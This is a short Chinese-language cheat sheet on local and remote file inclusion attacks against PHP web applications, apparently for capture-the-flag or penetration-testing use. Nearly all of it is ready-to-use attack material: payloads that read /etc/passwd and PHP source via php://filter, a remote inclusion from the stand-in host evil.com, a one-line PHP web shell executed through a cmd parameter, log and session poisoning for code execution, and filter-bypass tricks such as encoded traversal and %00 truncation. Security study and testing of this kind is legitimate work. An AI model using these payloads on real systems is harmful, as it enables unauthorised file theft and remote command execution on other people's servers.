# 文件包含 (LFI/RFI)

## 描述
通过包含本地或远程文件，读取敏感信息或执行恶意代码。

## 触发条件
- URL中存在参数如 `?file=index.php`、`?page=about`、`?path=../`。
- 参数值允许用户指定文件名。

## 检测方法
1. **本地文件包含测试**：尝试 `?file=/etc/passwd`（Linux）或 `?file=../../windows/win.ini`（Windows），观察是否显示文件内容。
2. **远程文件包含测试**：尝试 `?file=http://evil.com/shell.txt`，如果成功执行，说明RFI可用。

## 利用方式
- **读取敏感文件**：`/etc/passwd`、`/proc/self/environ`、`/flag`。
- **读取源码**：使用 `php://filter/convert.base64-encode/resource=index.php` 获取PHP源码。
- **日志包含**：包含 `/var/log/nginx/access.log` 或 `/var/log/apache2/access.log`，并写入PHP代码（通过User-Agent或请求参数）。
- **包含session文件**：如果知道session路径，可通过包含session文件触发代码执行。
- **远程文件包含**：在远程服务器上放置 `<?php system($_GET['cmd']); ?>`，然后通过 `?cmd=id` 执行命令。

## 绕过技巧
- **路径遍历**：使用 `../` 或 `....//` 绕过过滤。
- **编码绕过**：`%2e%2e%2f` 代替 `../`。
- **截断**：在PHP < 5.3.4可使用 `%00` 截断（如 `?file=../../etc/passwd%00`）。
- **协议封装**：使用 `php://input` 获取POST数据执行代码。

## 附加提示
- 如果包含图片马，可配合文件上传漏洞。
- 若PHP版本较新，`php://filter` 仍然可用，但 `%00` 截断已失效。